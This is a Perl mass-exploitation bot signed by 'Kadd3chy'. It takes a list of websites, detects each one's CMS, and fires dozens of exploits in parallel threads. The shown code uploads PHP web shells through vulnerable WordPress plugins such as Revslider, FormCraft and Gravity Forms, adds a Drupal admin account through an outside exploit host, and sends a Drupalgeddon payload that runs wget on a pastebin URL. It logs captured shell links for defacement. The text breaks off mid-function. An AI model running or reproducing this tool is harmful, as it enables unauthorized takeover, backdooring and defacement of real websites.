#!/usr/bin/perl

#Author : Kadd3chy

use IO::Select;
use HTTP::Response;
use HTTP::Request::Common qw(GET);
use URI::URL;
use IO::Socket::INET;
use Term::ANSIColor qw(:constants);
use MIME::Base64;
use LWP;
use HTTP::Cookies;
use HTML::Entities;
use URI::Escape;
use Win32::Console::ANSI;
use Term::ANSIColor;
use LWP::UserAgent;
use HTTP::Request;
use HTTP::Request::Common qw(POST);
use LWP::UserAgent;
use HTTP::Request::Common;
use Term::ANSIColor;
use HTTP::Request::Common qw(GET);
$ag = LWP::UserAgent->new();
use MIME::Base64;
use threads;
my $datetime    = localtime;

print color('reset');
if ($^O =~ /MSWin32/) {system("cls"); }else { system("clear"); 
system("title Kadd3chy Bot V2");

}
$Kadd3chy="
        .                                                      .
        .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
    `9XXXXXXXXXXXP' `9XX'   DIE    `98v8P'  HUMAN   `XXP' `9XXXXXXXXXXXP'
        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                     `'      9XXXXXX(   )XXXXXXP      `'
                              XXXX X.`v'.X XXXX
                              XP^X'`b   d'`X^XX
                              X. 9  `   '  P )X
                              `b  `       '  d'
                               `             '

\n\n";

system("title Kadd3chy Bot V3");

print color('bold green');
print $Kadd3chy;

print color('bold green'),"[";
print color('bold red'),"+";
print color('bold green'),"]";
print color("bold white")," Path To Your Threads : ";
my $thr = <STDIN>;
chomp $thr;

print color('bold green'),"[";
print color('bold red'),"+";
print color('bold green'),"]";
print color("bold white")," Path To Your Website List : ";
my $target = <STDIN>;
chomp $target;

open(Sites,"<".$target) or die $!;
while($site = <Sites>)
{
chomp($site);
push(@threads, threads->create (\&bot, $site));
sleep(1) while(scalar threads->list(threads::running) >= $thr);
}
eval {
$_->join foreach @threads;
@threads = ();
};
close(Sites);

sub bot(){

cmsdetcter();
}

sub cmsdetcter($site){

################ CMS Detecter #####################
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (15);
$magsite = $site . '/admin';
my $magcms = $ua->get("$magsite")->content;
my $spyxy = $ua->get("$site")->content;
if($spyxy =~/wp-content\/themes\/|wp-content\/plugins\/|wordpress/) {
print color('bold white'), "[+] $site"; 
print color("bold blue"), " - WordPress\n\n";print color('reset');
open(save, '>>Sites/WordPress.txt');
print save "$site\n";
close(save);
wpinstallcheck();
revslider();
addblockblocker();
blaze();
catpro();
cherry();
downloadsmanager();
formcraft();
levoslideshow();
powerzoomer();
gravityforms();
getconfig();
getconfig2();
showbiz();
ads();
slideshowpro();
wpmobiledetector();
wysija();
inboundiomarketing();
dzszoomsounds();
reflexgallery();
sexycontactform();
sexycontactform2();
simpleplugin();
wtffu();
phpeventcalendar();
synoptic();
Wpshop();
wpinjetc($site).
gravityy();
acento();
ajaxstore();
Antioch();
Authentic();
Churchope();
Epic();
Felis();
Force();
FR0();
hbaudio();
History();
Imageex();
kbslider();
Linenity();
Lote27();
Markant();
MichaelCanthony();
mTheme();
NativeChurch();
Parallelus();
RedSteel();
Revsliderss();
S3bubble();
SMWF();
TheLoft();
Trinity();
Urbancity();
Yakimabait();
Membership();
FileManagerwp();
Googlemp3();
Justifiedim();
Justified2();
Justified3();
Aspose();
Asposedoc();
MiwoFTP();
MiwoFTP2();
miniaudioplayer();
Ypotheme();
Media14();
wpmon();
mapprolbs();
cubed();
RightNow();
konzept();
omnisecurefiles();
pitchprint();
satoshi();
pinboard();
barclaycart();
wpinjection();

}

elsif($spyxy =~/<script type=\"text\/javascript\" src=\"\/media\/system\/js\/mootools.js\"><\/script>| \/media\/system\/js\/|com_content|Joomla!/) {
print color('bold white'),"[+] $site";	
print color("bold green"), " - Joomla\n\n";    print color('reset');
open(save, '>>Sites/Joomla.txt');
print save "$site\n";
close(save);
fox2();
b22j();
b2j();
comjce();
comedia();
comjdownloads();
comjdownloadsdef();
comfabrik();
comfabrikdef();
comfabrik2();
comfabrikdef2();
hdflvplayer();
comadsmanager();
comblog();
comusers();
comweblinks();
com_content();
mod_simplefileupload();
com_search();
com_admin1();
com_admin2();
com_content1();
com_content2();
com_weblinks();
com_mailto();
com_content3();
com_content4();
com_users();
com_installer();
com_search1();
com_poll();
com_banners();
com_mailto1();
com_a6mambocredits();
com_a6mambohelpdesk();
com_advancedpoll();
com_akocomment();
com_articles();
com_artlinks();
com_trade();
com_bayesiannaivefilter();
com_babackup();
redmy();
facile();
sujks();
rocks();
genesissimple();
developertools();
artuploader();
fancys();
hwdvideoshare();
ksadvertiser();
osproperty();
collector();
NovaSFH();
Jimtawl();
Proclaim();

}elsif($spyxy =~/Drupal|drupal|Sites\/all|drupal.org/) {
print color('bold white'),"[+] $site";	
print color("bold green"), " - Drupal\n\n";print color('reset');
open(save, '>>Sites/Drupal.txt');
print save "$site\n";
close(save);
drupal();
drupalgeddon();
}elsif($cms =~/Prestashop|prestashop/) {
print color('bold white'),"\n[$a] $site => ";
print color("bold green"), "Prestashop\n\n";
print color('reset');
open(save, '>>Sites/PrestaShop.txt');
print save "$site\n";   
close(save);
columnadverts();
soopamobile();
soopabanners();
vtermslideshow();
simpleslideshow();
productpageadverts();
homepageadvertise();
homepageadvertise2();
jro_homepageadvertise();
attributewizardpro();
oneattributewizardpro();
attributewizardproOLD();
attributewizardpro_x();
advancedslider();
cartabandonmentpro();
cartabandonmentproOld();
videostab();
wg24themeadministration();
fieldvmegamenu();
wdoptionpanel();
pk_flexmenu();
pk_vertflexmenu();
nvn_export_orders();
megamenu();
tdpsthemeoptionpanel();
psmodthemeoptionpanel();
masseditproduct();
}
elsif($magcms =~/Log into Magento Admin Page|name=\"dummy\" id=\"dummy\"|Magento/) {
print color('bold white'),"[+] $site";	
print color("bold green"), " - Magento\n\n";print color('reset');
open(save, '>>Sites/Magento.txt');
print save "$site\n";
close(save);
magento();
}elsif($spyxy =~/route=product|OpenCart|route=common|catalog\/view\/theme/) {
print color('bold white'),"[+] $site";	
print color("bold white"), " - OpenCart\n\n";print color('reset');
open(save, '>>Sites/vBulletin.txt');
print save "$site\n";
close(save);
opencart();
}elsif($efreez =~/<meta name="description" content="vBulletin Forums" \/>|<meta name="generator" content="vBulletin" \/>|vBulletin.version =|"baseurl_core":/){
print color('bold white'),"[+] $site";	
print color("bold green"), " - vBulletin\n\n";print color('reset');
open(save, '>>Sites/vBulletin.txt');
print save "$site\n";
close(save);
}else{
print color('bold white'),"[+] $site";	
print  color("bold red"), " - Unknown\n\n";print color('reset');
}
}

#  _____                         _ 
# |  __ \                       | |
# | |  | |_ __ _   _ _ __   __ _| |
# | |  | | '__| | | | '_ \ / _` | |
# | |__| | |  | |_| | |_) | (_| | |
# |_____/|_|   \__,_| .__/ \__,_|_|
#                   | |            
#                   |_|     
       
################ Drupal  Exploit #####################

##########################################################
#drupal exploit coded by fallaeg gassrini xD thnx gass <3#
##########################################################
sub drupal(){
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (20);

# check the link of the exploit or you can download script from here : http://pastebin.com/wPAbtyJ4 and you upload it on you one shell :) 
$drupalink = "http://oriflame-angela.ru/gassrini.php";
my $exploit = "$drupalink?url=$site&submit=submit";
$admin ="Kadd3chy";
$pass  ="Kadd3chy";
$dr = $site . '/user/login';
$red = $site . '/user/1';
my $checkk = $ua->get("$exploit")->content;
if($checkk =~/Success!/) {
print item(),"Drupal Add Admin";
print color('bold white')," ................... ";
print color('bold green'),"Vulnerable\n";
print item(),"URL : $dr\n";
print color('bold white'),"USER : $admin\n";
print color('bold white'),"PASS : $pass\n";
open (TEXT, '>>Result/Drupal.txt');
print TEXT "\nURL : $dr\n";
print TEXT "USER : $admin\n";
print TEXT "PASS : $pass\n\n";
close (TEXT);
}else{
print item(),"Drupal Add Admin";
print color('bold white')," .................. ";
print color('bold red'),"Not Vulnerable\n";
        }

}

sub drupalgeddon(){
my $url = "$site/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax";
$ajax = "_drupa_ajax";
$mail = "mail[#post_render][]";
$mailt= "mail[#type]";
$mailm = "mail[#markup]";
$wget = "wget https://pastebin.com/raw/xR3yLfM3";
$response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [form_id => 'user_register_form', $ajax => '1', $mail => 'exec', $mailt => 'markup', $mailm => $wget]);

if ($response =~ /200/){
print item(),"Drupalgeddon";
print color('bold white')," ...................... ";
print color('bold green'),"Vulnerable\n\n";
print item(),"Done Shell Uploaded\n";
print color('bold white'),"  [Here] => $site/Kadd3chy.php\n";
open (TEXT, '>>Shells.txt');
print TEXT "$up\n";
close (TEXT);
}else{
print item(),"Drupalgeddon";
print color('bold white')," ...................... ";
print color('bold red'),"Not Vulnerable\n\n";
}

sub item
{
    my $n = shift // '+';
    return color('bold red')," ["
    , color('bold green'),"$n"
    , color('bold red'),"] "
    , color("bold white")
    ;
}

#  __  __                        _        
# |  \/  |                      | |       
# | \  / | __ _  __ _  ___ _ __ | |_ ___  
# | |\/| |/ _` |/ _` |/ _ \ '_ \| __/ _ \ 
# | |  | | (_| | (_| |  __/ | | | || (_) |
# |_|  |_|\__,_|\__, |\___|_| |_|\__\___/ 
#                __/ |                    
#               |___/        
             
################ Magento Exploit #####################

sub magento(){

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (20);
print"[Magento] Exploiting ........... ";


$magentoxlink = "http://localhost/magentox.php";
my $exploitspymag = "$magentoxlink?url=$site&submit=submit";
my $checkksbir = $ua->get("$exploitspymag")->content;
if($checkksbir =~/Success /) {

    print color('bold green');
print "[Success]\n";
    print color('reset');
    open(save, '>>Result/Bruted.txt');
    print save "[Magento] $site hydra|hydra77\n";
    close(save);
    }
else{
    print color('bold red');
print  "[Not Vulnerable]\n";
    print color('reset');


        }

}
################ Adblock Blocker #####################
############### Revshell  ####################
sub revslider(){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider Shell Exploiting .. ";

my $path = "wp-admin/admin-ajax.php";


my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
my $exploit = $ua->post("$site/$path", Cookie => "", Content_Type => "form-data", Content => [action => "revslider_ajax_action", client_action => "update_plugin", update_file => ["Kadd3chyrev.zip"]]);

if ($exploit->decoded_content =~ /Wrong update extracted folder/) {
    print color('bold green');
print "[Done Shell Uploaded]\n";
    print color('reset');

my $check = $ua->get("$site/wp-content/plugins/revslider/temp/update_extract/revslider/Kadd3chy.php")->content;
if($check =~/Kadd3chy/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white')," Exploiting .. ";
    print color('reset');
   print color('bold green');
print "[Done Shell Uploaded]\n";
    print color('reset');

    open(save, '>>Result/Shells.txt');
    print save "$site/wp-content/plugins/revslider/temp/update_extract/revslider/Kadd3chy.php\n";
    close(save); 
	$def = "$site/Don3.html";
	zoneh();
    } else {  }
my $avada = $ua->get("$site/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/Kadd3chy.php")->content;
if($avada =~/Kadd3chy/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Waiting For Upload Shell";
    print color('reset');
   print color('bold green');
print "[Done Shell Uploaded]\n";
    print color('reset');    open(save, '>>Result/Shells.txt');
    print save "$site/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/Kadd3chy.php\n";
    close(save); 
    	$def = "$site/Don3.html";
	zoneh();

}
else {  }
my $striking_r = $ua->get("$site/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/Kadd3chy.php")->content;
if($striking_r =~/Kadd3chy/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Waiting For Upload Shell";
    print color('reset');
   print color('bold green');
print "[Done Shell Uploaded]\n";
    print color('reset');    open(save, '>>Result/Shells.txt');
    print save "$site/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/Kadd3chy.php\n";
    close(save); 
		$def = "$site/Don3.html";
	zoneh();

}
else {  }
my $IncredibleWP = $ua->get("$site/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/Kadd3chy.php")->content;
if($IncredibleWP =~/Kadd3chy/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Waiting For Upload Shell";
    print color('reset');
   print color('bold green');
print "[Done Shell Uploaded]\n";
    print color('reset');    open(save, '>>Result/Shells.txt');
    print save "$site/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/Kadd3chy.php\n";
    close(save); 
		$def = "$site/Don3.html";
	zoneh();

}
else {  }
my $ultimatum = $ua->get("$site/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/Kadd3chy.php")->content;
if($ultimatum =~/Kadd3chy/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Waiting For Upload Shell";
    print color('reset');
   print color('bold green');
print "[Done Shell Uploaded]\n";
    print color('reset');    open(save, '>>Result/Shells.txt');
    print save "$site/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/Kadd3chy.php\n";
    close(save); 
		$def = "$site/Don3.html";
	zoneh();

}
else {  }
my $medicate = $ua->get("$site/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/Kadd3chy.php")->content;
if($medicate =~/Kadd3chy/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Waiting For Upload Shell";
    print color('reset');
   print color('bold green');
print "[Done Shell Uploaded]\n";
    print color('reset');    open(save, '>>Result/Shells.txt');
    print save "$site/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/Kadd3chy.php\n";
    close(save); 
		$def = "$site/Don3.html";
	zoneh();

}
else {  }
my $centum = $ua->get("$site/wp-content/themes/centum/revslider/temp/update_extract/revslider/Kadd3chy.php")->content;
if($centum =~/Kadd3chy/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Waiting For Upload Shell";
    print color('reset');
   print color('bold green');
print "[Done Shell Uploaded]\n";
    print color('reset');    open(save, '>>Result/Shells.txt');
    print save "$site/wp-content/themes/centum/revslider/temp/update_extract/revslider/Kadd3chy.php\n";
    close(save); 
		$def = "$site/Don3.html";
	zoneh();

}
else {  }
my $beach_apollo = $ua->get("$site/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/Kadd3chy.php")->content;
if($beach_apollo =~/Kadd3chy/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Waiting For Upload Shell";
    print color('reset');
   print color('bold green');
print "[Done Shell Uploaded]\n";
    print color('reset');    open(save, '>>Result/Shells.txt');
    print save "$site/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/Kadd3chy.php\n";
    close(save); 
		$def = "$site/Don3.html";
	zoneh();

}
else { }
my $cuckootap = $ua->get("$site/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/Kadd3chy.php")->content;
if($cuckootap =~/Kadd3chy/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Waiting For Upload Shell";
    print color('reset');
   print color('bold green');
print "[Done Shell Uploaded]\n";
    print color('reset');    open(save, '>>Result/Shells.txt');
    print save "$site/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/Kadd3chy.php\n";
    close(save); 
		$def = "$site/Don3.html";
	zoneh();

}
else {  }
my $pindol = $ua->get("$site/wp-content/themes/pindol/revslider/temp/update_extract/revslider/Kadd3chy.php")->content;
if($pindol =~/Kadd3chy/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Waiting For Upload Shell";
    print color('reset');
   print color('bold green');
print "[Done Shell Uploaded]\n";

    open(save, '>>Result/Shells.txt');
    print save "$site/wp-content/themes/pindol/revslider/temp/update_extract/revslider/Kadd3chy.php\n";
    close(save); 
		$def = "$site/Don3.html";
	zoneh();

}
else {  }
my $designplus = $ua->get("$site/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/Kadd3chy.php")->content;
if($designplus =~/Kadd3chy/) {

   print color('bold yellow');
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Waiting For Upload Shell";
    print color('reset');
   print color('bold green');
print "[Done Shell Uploaded]\n";
    print color('reset');    open(save, '>>Result/Shells.txt');
    print save "$site/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/Kadd3chy.php\n";
    close(save); 
		$def = "$site/Don3.html";
	zoneh();

}
else {  }
my $rarebird = $ua->get("$site/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/Kadd3chy.php")->content;
if($rarebird =~/Kadd3chy/) {

   print color('bold yellow');
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Waiting For Upload Shell";
    print color('reset');
   print color('bold green');
print "[Done Shell Uploaded]\n";
    print color('reset');
    open(save, '>>Result/Shells.txt');
    print save "$site/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/Kadd3chy.php\n";
    close(save); 
		$def = "$site/Don3.html";
	zoneh();

}
else {  }
my $andre = $ua->get("$site/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/Kadd3chy.php")->content;
if($andre =~/Kadd3chy/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Waiting For Upload Shell";
    print color('reset');
   print color('bold green');
print "[Done Shell Uploaded]\n";
    print color('reset');    open(save, '>>Result/Shells.txt');
    print save "$site/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/Kadd3chy.php\n";
    close(save); 
		$def = "$site/Don3.html";
	zoneh();

}
else { }
} else {
    print color('bold red');
print  "Not Vulnerable\n";
    print color('reset');
}
}

################ Adblock Blocker #####################
sub addblockblocker(){

my $addblockurl = "$site/wp-admin/admin-ajax.php?action=getcountryuser&cs=2";
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => [popimg => ["Kadd3chy.php"],]);
$addblockup="$site/wp-content/uploads/$year/$month/Kadd3chy.php";
my $checkaddblock = $ua->get("$addblockup")->content;

if($checkaddblock =~/Kadd3chy/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Adblock Blocker";
print color('bold white')," Exploiting .. ";
print color('bold white'),"";
print color('bold green'),"Vulnerable";
print color('bold white'),"\n";
print color('bold white'),"Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $addblockup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$addblockup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Adblock Blocker";
print color('bold white')," Exploiting .. ";
print color('bold red'),"Not Vulnerable ";
print color('bold white'),"\n";}
}

################ Blaze #####################
sub blaze(){
my $url = "$site/wp-admin/admin.php?page=blaze_manage";
my $blazeres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["Kadd3chy.php"], task => 'blaze_add_new_album', album_name => '', album_desc => '',]);

if ($blazeres->content =~ /\/uploads\/blaze\/(.*?)\/big\/Kadd3chy.php/) {
$uploadfolder=$1;
$blazeup="$site/wp-content/uploads/blaze/$uploadfolder/big/Kadd3chy.php";
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Blaze";
print color('bold white')," Exploiting ............ ";
print color('bold white'),"";
print color('bold green'),"Vulnerable";
print color('bold white'),"\n";
print color('bold white'),"Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $blazeup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$blazeup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Blaze";
print color('bold white')," Exploiting ............ ";
print color('bold red'),"Not Vulnerable";
print color('bold white'),"\n";
}
}

################ Job_Manager #####################

 sub mods(){
 
my $gh = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$gh->timeout(10);
$gh->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
   
   
$files="Kadd3chy.gif";
$jdup= $site . '/jm-ajax/upload_file';
$checkgif= $site . "/wp-content/uploads/job-manager-uploads/company_logo/$year/$month/Kadd3chy.gif";
$checkgif2= $site . "/wp-content/uploads/job-manager-uploads/company_logo/$year/$month/Kadd3chy.gif";


my $exploit = $gh->post("$jdup", Content_Type => "multipart/form-data", Content => [  company_logo=>["$files"]  ]);



my $check = $gh->get("$checkgif")->status_line;
if($check =~/200/) {
my $check1 = $gh->get("$checkgif2")->content_type;
if($check1 =~/image\/gif/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Job Manager";
print color('bold white')," Exploiting ...... ";
print color('bold white'),"";
print color('bold green'),"Vulnerable";
print color('bold white'),"\n";
print color("bold white"),("[Done Uploaded] ==> $site/wp-content/uploads/job-manager-uploads/company_logo/2017/06/Kadd3chy.gif\n");
print color 'reset';                 
        open (TEXT, '>>Result/uploaded.txt');
		print TEXT "Shell Link => $site/wp-content/uploads/job-manager-uploads/company_logo/2017/06/Kadd3chy.gif\n";
        close (TEXT);
}
}
else
{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";


print color('bold white'),"Job Manager";
print color('bold white')," Exploiting ...... ";
print color('bold red'),"Not Vulnerable ";
print color('bold white'),"\n";
}
}

################ gravity deface #####################
sub gravityy(){
chomp($_);
$site = $_;
my $path = "/?gf_page=upload";
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
my $exploit = $ua->post("$site/$path", Cookie => "", Content_Type => "form-data", Content => [file => ["Kadd3chydef.jpg"], field_id => "3", form_id => "1",gform_unique_id => "../../../", name => "Kadd3chy.php5"]);

if ($exploit->decoded_content =~ /_input_3_Kadd3chy.php5/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Gravity Deface";
print color('bold white')," Exploiting ... ";
print color('bold white'),"";
print color('bold green'),"Vulnerable";
print color('bold white'),"\n";
print color('bold white'),"Done Index Uploaded\n";
print color('bold white'),"  Shell Link => $site/wp-content/uploads/_input_3_Kadd3chy.php5\n";
open(save, '>>Result/Gravity-K.txt');
    print save "$site/wp-content/uploads/_input_3_Kadd3chy.php5\n";
    close(save);
}

else { 
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Gravity Deface";
print color('bold white')," Exploiting ... ";
print color('bold red'),"Not Vulnerable ";
print color('bold white'),"\n";

}
}
################ Catpro #####################
sub catpro(){

my $url = "$site/wp-admin/admin.php?page=catpro_manage";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["Kadd3chy.php"], task => 'cpr_add_new_album', album_name => '', album_desc => '',]);

if ($response->content =~ /\/uploads\/catpro\/(.*?)\/big\/Kadd3chy.php/) {
$uploadfolder=$1;
$catproup="$site/wp-content/uploads/catpro/$uploadfolder/big/Kadd3chy.php";
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Catpro";
print color('bold white')," Exploiting ........... ";
print color('bold white'),"";
print color('bold green'),"Vulnerable";
print color('bold white'),"\n";
print color('bold white'),"Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $catproup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$catproup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Catpro";
print color('bold white')," Exploiting ........... ";
print color('bold red'),"Not Vulnerable ";
print color('bold white'),"\n";
}
}

################ Cherry Plugin #####################
sub cherry(){

my $url = "$site/wp-content/plugins/cherry-plugin/admin/import-export/Kadd3chy.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [file => ["Kadd3chy.php"],]);

$cherryup="$site/wp-content/plugins/cherry-plugin/admin/import-export/Kadd3chy.php";

my $checkcherry = $ua->get("$cherryup")->content;
if($checkcherry =~/Kadd3chy/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Cherry Plugin";
print color('bold white')," Exploiting .. ";
print color('bold white'),"";
print color('bold green'),"Vulnerable";
print color('bold white'),"\n";
print color('bold white'),"Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $cherryup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$cherryup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Cherry Plugin";
print color('bold white')," Exploiting .. ";
print color('bold red'),"Not Vulnerable";
print color('bold white'),"\n";
}
}

################ Download Manager #####################
sub downloadsmanager(){
$downloadsmanagervuln="$site/wp-content/plugins/downloads-manager/readme.txt";
my $url = "$site";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [upfile => ["Kadd3chy.php"], dm_upload => '',]);
$dmup="$site/wp-content/plugins/downloads-manager/upload/Kadd3chy.php";
my $checkdm = $ua->get("$dmup")->content;
if($checkdm =~/Kadd3chy/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Download Manager";
print color('bold white')," Exploiting .. ";
print color('bold green'),"Vulnerable";
print color('bold white'),"\n";
print color('bold white'),"Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $dmup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$dmup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Download Manager";
print color('bold white')," Exploiting .. ";
print color('bold red'),"Not Vulnerable";
print color('bold white'),"\n";
}
}

############### formcraft ####################

sub formcraft(){

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"FormCraft Upload .................. ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (10);
$link = $site."/wp-content/plugins/formcraft/file-upload/server/php/";
my $conte = $ua->get("$link")->content;
if ($conte =~/{"files"/){
   
    upform();
}else{
    print color('bold red');
print  "Not Vulnerable\n";
    print color('reset');

}

}

sub upform(){
{
my $url = "$site/wp-content/plugins/formcraft/file-upload/server/php/";
my $picture ="Kadd3chy.php"; 
my $field_name = "files[]";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ $field_name => ["$picture"] ]
           
            );
$upzzspy = $site. '/wp-content//plugins//formcraft//file-upload//server//php//files//Kadd3chy.php'; 
my $taz = $ua->get("$upzzspy")->content;
if ($taz =~ /Kadd3chy/){
   print color('bold green');
print "[Success]\n";
print color('reset');
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $upzzspy\n";

open(save, '>>Result/Shells.txt');   
print save "$upzzspy\n";   
close(save);
}else{
    print color('bold red');
print  "Not Vulnerable\n";
    print color('reset');}
}

}

################ levoslideshow #####################
sub levoslideshow(){

my $url = "$site/wp-admin/admin.php?page=levoslideshow_manage";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["Kadd3chy.php"], task => 'lvo_add_new_album', album_name => '', album_desc => '',]);

if ($response->content =~ /\/uploads\/levoslideshow\/(.*?)\/big\/Kadd3chy.php/) {
$uploadfolder=$1;
$levoslideshowup="$site/wp-content/uploads/levoslideshow/$uploadfolder/big/Kadd3chy.php";
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"levoslideshow";
print color('bold white')," Exploiting .. ";
print color('bold white'),"";
print color('bold green'),"Vulnerable";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
